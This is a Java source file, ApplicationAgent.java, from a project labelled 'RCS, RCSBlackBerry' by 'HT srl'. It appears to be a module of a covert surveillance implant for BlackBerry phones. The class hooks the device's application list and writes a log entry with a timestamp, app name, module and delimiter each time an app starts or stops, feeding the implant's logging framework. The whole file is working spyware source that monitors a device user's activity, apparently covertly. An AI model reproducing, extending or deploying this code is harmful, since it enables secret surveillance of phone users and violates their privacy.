//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ApplicationAgent.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry.agent;

import java.util.Vector;

import blackberry.AppListener;
import blackberry.Conf;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * log dei start e stop delle applicazioni.
 */
public final class ApplicationAgent extends Agent implements
        ApplicationListObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ApplicationAgent",
            DebugLevel.VERBOSE);
    //#endif

    public int LOG_DELIMITER = 0xABADC0DE;

    boolean firstRun = true;

    /**
     * Instantiates a new application agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ApplicationAgent(final boolean agentStatus) {
        super(Agent.AGENT_APPLICATION, agentStatus,
                Conf.AGENT_APPLICATION_ON_SD, "ApplicationAgent");
    }

    /**
     * Instantiates a new application agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ApplicationAgent(final boolean agentStatus,
            final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        firstRun = true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualStart addApplicationListObserver");
        //#endif

        AppListener.getInstance().addApplicationListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualStop removeApplicationListObserver");
        //#endif
        AppListener.getInstance().removeApplicationListObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.ApplicationListObserver#onApplicationListChange
     * (java.util.Vector, java.util.Vector)
     */
    public synchronized void onApplicationListChange(
            final Vector startedListName, final Vector stoppedListName,
            final Vector startedListMod, final Vector stoppedListMod) {

        //#ifdef DBC
        Check.requires(startedListName != null, "startedListName != null");
        Check.requires(stoppedListName != null, "stoppedListName != null");
        Check.requires(startedListMod != null, "startedListMod != null");
        Check.requires(stoppedListMod != null, "stoppedListMod != null");
        //#endif

        if (firstRun && ! Status.getInstance().isRestarting()) {
            //#ifdef DEBUG_INFO
            debug.info("skipping first run");
            //#endif

            //#ifdef DBC
            Check.asserts(startedListName.size() > 0, "startedList.size() > 0: " );
            Check.asserts(stoppedListName.size() == 0,
                    "stoppedList.size() == 0");
            Check.asserts(startedListMod.size() > 0, "startedListMod.size() > 0");
            Check
                    .asserts(stoppedListMod.size() == 0,
                            "stoppedListMod.size() == 0");
            //#endif

            firstRun = false;
            return;
        }

        log.createLog(null);

        int size = startedListName.size();
        for (int i = 0; i < size; i++) {
            final String name = (String) startedListName.elementAt(i);
            final String mod = (String) startedListMod.elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace(name + " START");
            //#endif
            writeLog(name, "START", mod);
        }

        size = stoppedListName.size();
        for (int i = 0; i < size; i++) {
            final String name = (String) stoppedListName.elementAt(i);
            final String mod = (String) stoppedListMod.elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace(name + " STOP");
            //#endif
            writeLog(name, "STOP", mod);
        }

        log.close();

        //#ifdef DEBUG_TRACE
        debug.trace("finished writing log");

        //#endif
    }

    public synchronized void onApplicationListChangeMod(
            final Vector startedList, final Vector stoppedList) {
        //TODO: onApplicationListChangeMod
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG_TRACE
        debug.trace("parse");
        //#endif

        //#ifdef DEBUG
        //StringBuffer sb = new StringBuffer();
        //debug.info(sb.toString());
        //#endif

        return false;
    }

    private void writeLog(final String appName, final String condition,
            final String mod) {
        final byte[] tm = (new DateTime()).getStructTm();

        final Vector items = new Vector();
        items.addElement(tm);
        items.addElement(WChar.getBytes(appName, true));
        items.addElement(WChar.getBytes(condition, true));
        items.addElement(WChar.getBytes(mod, true));
        items.addElement(Utils.intToByteArray(LOG_DELIMITER));
        log.writeLogs(items);

    }
}
